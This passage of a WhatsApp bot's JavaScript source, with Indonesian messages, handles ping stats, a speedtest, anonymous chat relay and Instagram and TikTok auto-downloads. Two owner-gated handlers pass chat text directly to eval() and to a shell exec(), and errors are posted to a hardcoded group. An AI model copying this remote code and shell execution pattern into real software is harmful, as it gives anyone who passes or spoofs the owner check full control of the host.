        let latensi = speed() - timestamp;
        neww = performance.now();
        oldd = performance.now();
        respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${
          oldd - neww
        } _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${os.totalmem() - os.freemem()} / ${os.totalmem()}

_NodeJS Memory Usaage_
${Object.keys(used)
.map(
  (key, _, arr) =>
    `${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${
      used[key]
    }`
)
.join("\n")}

${
cpus[0]
  ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
      .map(
        (type) =>
          `- *${(type + "*").padEnd(6)}: ${(
            (100 * cpu.times[type]) /
            cpu.total
          ).toFixed(2)}%`
      )
      .join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
.map(
  (cpu, i) =>
    `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
      cpu.times
    )
      .map(
        (type) =>
          `- *${(type + "*").padEnd(6)}: ${(
            (100 * cpu.times[type]) /
            cpu.total
          ).toFixed(2)}%`
      )
      .join("\n")}`
)
.join("\n\n")}`
  : ""
}
`.trim();
        reply(respon);
      }
      break;
    case "runtime":
      reply(runtime(process.uptime()));
      break;
    case "speedtest":
      {
        m.reply("Testing Speed...");
        let cp = require("child_process");
        let { promisify } = require("util");
        let exec = promisify(cp.exec).bind(cp);
        let o;
        try {
          o = await exec("python speed.py");
        } catch (e) {
          o = e;
        } finally {
          let { stdout, stderr } = o;
          if (stdout.trim()) m.reply(stdout);
          if (stderr.trim()) m.reply(stderr);
        }
      }
      break;
  case "callme": {
    await reply(`okay, i'll call you.`)
    try {
    await satria.query((
      {
      tag: 'call',
   attrs: {
                from: botNumber,
                to: m.sender,
            },
            content: [{
                    tag: 'offer',
                    attrs: {
                        'call-id': m.id,
                        'call-creator': botNumber,
                        count: '1',
                    },
                }],
        }));
    } catch (error) {
      reply(error)
    }
  }
    break;
default:
}
}
        if (m.chat.endsWith("@s.whatsapp.net") && m.message) {
          this.menfess = this.menfess ? this.menfess : {};
          let room = Object.values(this.menfess).find(
            (room) =>
              [room.a, room.b].includes(m.sender) && room.state === "ACTIVE"
          );
          if (room) {
            if (/^.*(dm|deletemenfess|hapusmenfess|batal)/.test(m.text))
              return m.reply("ketik deletemenfess untuk menghapus sesi.");
            let other = [room.a, room.b].find((user) => user !== m.sender);
            m.copyNForward(
              other,
              true,
              m.quoted && m.quoted.fromMe
                ? {
                    contextInfo: {
                      ...m.msg.contextInfo,
                      forwardingScore: 0,
                      isForwarded: true,
                      participant: other,
                    },
                  }
                : {}
            );
          }
        }
  if (m.chat.endsWith("@s.whatsapp.net") && m.message) {
          this.menfess = this.menfess ? this.menfess : {};
          let room = Object.values(this.menfess).find(
            (room) =>
              [room.a, room.b].includes(m.sender) && room.state === "WAITING"
          );
          if (room) {
            if (m.sender == room.b) {
              if (m.text == "Y") {
                reply(
                  "Anonymous Chat Telah Tersambung\nKetik .hapusmenfess untuk berhenti"
                );
                room.state = "ACTIVE";
                let other = [room.a, room.b].find((user) => user !== m.sender);
                satria.sendMessage(other, {
                  text: "Penerima Telah Menkonfirmasi, sekarang Anonymous Chat Telah Tersambung",
                },{ quoted: fkontak });
              }
              if (m.text == "N") {
                reply("oke.");
                let other = [room.a, room.b].find((user) => user !== m.sender);
                satria.sendMessage(other, {
                  text: "Penerima Menolak Anonymous, NiceTry Ya wkwk 😁👍",
                },{ quoted: fkontak });
                delete this.menfess[room.id];
              }
            }
          }
        }
if (budy.startsWith(".")) {
if (budy == '.') return {}
let loli = getAllCmd();
let suggestion = didYouMean(command, loli);
if (suggestion !== null) {
reply(
`Command *${m.text}* Tidak Ada Dalam List Menu\nMungkin Maksud Anda .*${suggestion.correctedWord}*?`
);
}
}
if (budy.startsWith(">")) {
  if (!isCreator) return reply(mess.ownerOnly);

  // Membungkus evaluasi dalam Promise
  const evalAsync = () => {
    return new Promise(async (resolve, reject) => {
      try {
        let evaled = await eval(budy.slice(2));
        if (typeof evaled !== "string") evaled = require("util").inspect(evaled);
        resolve(evaled);
      } catch (err) {
        reject(err);
      }
    });
  };

  // Menjalankan evaluasi asinkron
  evalAsync()
    .then((result) => reply(result))
    .catch((err) => reply(String(err)));
}

if (budy.startsWith("$")) {
if (!isCreator) return reply(mess.ownerOnly);
reply("Executing...");
exec(budy.slice(2), async(err, stdout) => {
if (err) return reply(`${err}`);
if (stdout) return reply(stdout);
});
}
if (budy.includes("bot")) {
let aud = [
"https://ami.animecharactersdatabase.com/audio/104732/1/104732-1-29.mp4",
"https://ami.animecharactersdatabase.com/audio/107762/3/107762-3-20.mp4",
"https://ami.animecharactersdatabase.com/audio/1556/1/1556-1-205.mp4",
"https://ami.animecharactersdatabase.com/audio/105462/1/105462-1-24.mp4",
];
satria.sendMessage(
from,
{
audio: { url: pickRandom(aud) },
mimetype: "audio/mpeg",
ptt: true,
seconds: 6000,
},
{ quoted: m }
);
}
// Auto Dl

if (/^(https?|ftp):\/\/[^\s\/$.?#][^\s]*$/.test(budy)) {
if (budy.includes("instagram.com")) {
await react(pickRandom(["🫡", "🕛", "⏳"]));
const { igdl } = require("btch-downloader");
const res = await igdl(await extractUrlFromText(budy));

for (let i of res) {
console.log(i);
await satria.sendFileFromUrl(from, i.url, "", m, {
ephemeralExpiration: WA_DEFAULT_EPHEMERAL,
});
}
await react(pickRandom(["👌", "✅", "✔️"]));
}
if (budy.includes("tiktok")) {
await react(pickRandom(["🫡", "🕛", "⏳"]));
const { ttdl } = require("btch-downloader");
try {
await ttdl(await extractUrlFromText(budy)).then(async (res) => {
await satria.sendMessage(
m.chat,
{
video: await getBuffer(res.video), 
jpegThumbnail: new Uint8Array(2137),
caption: ``,
},
{ quoted: m }
);
});
await react(pickRandom(["👌", "✅", "✔️"]));
} catch (error) {
const tik = require("tiktod");
tik.download(await extractUrlFromText(budy)).then((json) => {
for (let i of json.result.media) {
satria.sendFileFromUrl(m.chat, i, "done", m);
}
});
await react(pickRandom(["👌", "✅", "✔️"]));
}
}
if (/https:\/\/on\.souncloud\.com/i.test(budy)) {

}
}
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith("broadcast")) return;
if (m.isBaileys) return;
if (!budy.toLowerCase()) return;
}
} catch (err) {
const errorMessage = `
┌──「 *Error Notification* 」
│
├ Error : ${util.format(err)}
│
┗─────────────────`;
console.error(util.format(err));
satria.sendMessage("120363166125652167@g.us", { text: errorMessage });
}

};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
fs.unwatchFile(file);
console.log(chalk.blueBright(`Update ${__filename}`));
delete require.cache[file];
require(file);
fs.unwatchFile(file);
console.log(chalk.blueBright(`Update ${__filename}`));
delete require.cache[file];
require(file);

});


